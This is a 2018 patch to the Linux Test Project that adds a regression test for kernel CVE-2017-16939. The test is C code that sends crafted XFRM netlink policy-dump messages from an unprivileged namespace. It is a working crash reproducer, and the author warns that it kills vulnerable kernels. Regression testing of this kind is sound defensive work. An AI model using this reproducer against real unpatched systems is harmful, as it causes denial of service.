From: Michael Moese <mmoese@suse.de>
Date: Tue,  6 Feb 2018 15:03:59 +0100
Subject: [LTP] [PATCH] Add regression test for CVE-2017-16939
Message-ID: <20180206140359.18387-1-mmoese@suse.de>
List-Id: <ltp.lists.linux.it>
MIME-Version: 1.0
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
To: ltp@lists.linux.it

Based on the reproducing code from Mohammed Ghannam, published on
https://blogs.securiteam.com/index.php/archives/3535

Warning! If the kernel is vulnerable to this CVE, it will definitely
die with "Fatal Exception in Interrupt". So do not run this on a
production machine!

Signed-off-by: Michael Moese <mmoese@suse.de>
---
 runtest/cve                    |   1 +
 testcases/cve/.gitignore       |   1 +
 testcases/cve/cve-2017-16939.c | 132 +++++++++++++++++++++++++++++++++++++++++
 3 files changed, 134 insertions(+)
 create mode 100644 testcases/cve/cve-2017-16939.c

diff --git a/runtest/cve b/runtest/cve
index 6de2ed0ac..b93efb57a 100644
--- a/runtest/cve
+++ b/runtest/cve
@@ -29,3 +29,4 @@ cve-2017-17807 request_key04
 cve-2017-1000364 stack_clash
 cve-2017-5754 meltdown
 cve-2017-17052 cve-2017-17052
+cve-2017-16939 cve-2017-16939
diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
index 42f32e825..8db78fd87 100644
--- a/testcases/cve/.gitignore
+++ b/testcases/cve/.gitignore
@@ -11,3 +11,4 @@ cve-2017-5669
 meltdown
 stack_clash
 cve-2017-17052
+cve-2017-16939
diff --git a/testcases/cve/cve-2017-16939.c b/testcases/cve/cve-2017-16939.c
new file mode 100644
index 000000000..ea56530c7
--- /dev/null
+++ b/testcases/cve/cve-2017-16939.c
@@ -0,0 +1,132 @@
+/*
+ * Copyright (c) 2018 Michael Moese <mmoese@suse.de>
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program. If not, see <http://www.gnu.org/licenses/>.
+ */
+/* Regression test for CVE-2017-16939
+ * based on the reproducing code from Mohammed Ghannam, published on
+ * https://blogs.securiteam.com/index.php/archives/3535
+ *
+ * CAUTION! If your system is vulnerable to this CVE, the kernel
+ * WILL die with a "Fatal Exception in Interrupt".
+ */
+
+#include <unistd.h>
+#include <sched.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <netinet/in.h>
+#include <linux/netlink.h>
+#include <linux/xfrm.h>
+
+#include "tst_test.h"
+#include "tst_res_flags.h"
+#include "tst_safe_macros.h"
+#include "tst_safe_net.h"
+
+#define BUFSIZE 2048
+
+static int fd;
+static struct sockaddr_nl addr;
+
+struct msg_policy {
+	struct nlmsghdr msg;
+	char buf[BUFSIZE];
+};
+
+static void create_nl_socket(void)
+{
+	fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_XFRM);
+	memset(&addr, 0, sizeof(struct sockaddr_nl));
+	addr.nl_family = AF_NETLINK;
+	addr.nl_pid = 0; /* packet goes into the kernel */
+	addr.nl_groups = XFRMNLGRP_NONE; /* no need for multicast group */
+}
+
+static void do_setsockopt(void)
+{
+	int var = 0x100;
+
+	SAFE_SETSOCKOPT(fd, 1, SO_RCVBUF, &var, sizeof(int));
+}
+
+static struct msg_policy *init_policy_dump(void)
+{
+	struct msg_policy *r;
+
+	r = SAFE_MALLOC(sizeof(struct msg_policy));
+	memset(r, 0, sizeof(struct msg_policy));
+
+	r->msg.nlmsg_len = 0x10;
+	r->msg.nlmsg_type = XFRM_MSG_GETPOLICY;
+	r->msg.nlmsg_flags = NLM_F_MATCH | NLM_F_MULTI |  NLM_F_REQUEST;
+	r->msg.nlmsg_seq = 0x1;
+	r->msg.nlmsg_pid = 2;
+
+	return r;
+}
+
+static int send_msg(int fd, struct nlmsghdr *msg)
+{
+	return SAFE_SENDTO(1, fd, (void *) msg, msg->nlmsg_len, 0,
+			   (struct sockaddr *) &addr,
+			   sizeof(struct sockaddr_nl));
+}
+
+static void create_ns(void)
+{
+	if (unshare(CLONE_NEWUSER) != 0)
+		tst_brk(TCONF, "unshare(CLONE_NEWUSER) failed");
+	if (unshare(CLONE_NEWNET) != 0)
+		tst_brk(TCONF, "unshare(CLONE_NEWNET) failed");
+}
+
+static void do_run(void)
+{
+	struct msg_policy *p;
+
+	create_ns();
+	create_nl_socket();
+	p = init_policy_dump();
+	do_setsockopt();
+	send_msg(fd, &p->msg);
+	p = init_policy_dump();
+	send_msg(fd, &p->msg);
+
+	exit(0);
+}
+
+static void run(void)
+{
+	pid_t pid;
+	int status;
+
+	pid = SAFE_FORK();
+	if (pid == 0) {
+		do_run();
+	} else {
+		usleep(250000);
+		SAFE_WAITPID(pid, &status, 0);
+		if (!WIFEXITED(status))
+			tst_res(TFAIL, "Kernel has issues");
+	}
+	tst_res(TPASS, "Kernel seems to have survived");
+}
+
+static struct tst_test test = {
+	.forks_child = 1,
+	.test_all = run,
+};
-- 
2.13.6

